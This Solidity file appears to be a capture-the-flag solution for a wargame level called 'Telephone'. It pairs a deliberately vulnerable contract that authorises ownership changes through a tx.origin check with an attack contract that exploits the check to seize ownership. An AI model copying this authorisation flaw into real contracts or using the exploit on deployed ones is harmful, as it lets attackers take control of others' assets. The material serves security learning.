/* 
Claim ownership of the contract below to complete this level.

contract has  a state variable owner of type address.

contract has a constructor which sets owner = msg.sender (Now owner is the one who deployed the contract)

contract has a function called changeOwner which takes an argument called _owner of type address.
 Inside teh changeOwner function there is a condition check (tx.origin != msg.sender). If the condition evaluates to true
 owner is reassigned to _owner value.

 So if somebody calls this function from an EOA - then tx.origin is the EOA it self

 If a contract calls the function changeOwner, then msg.sender is the contact address and tx.origin is the EOA which are not equal.

 if they are not equal then the _owner is the new owner. That's exactly needed to win this game.

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}


contract HackTheTelephone {
    Telephone telephone;

    constructor (address telAddress) {
        telephone = Telephone(telAddress);
    }

    function becomeOwner(address _address) public {
        telephone.changeOwner(_address);
    }


}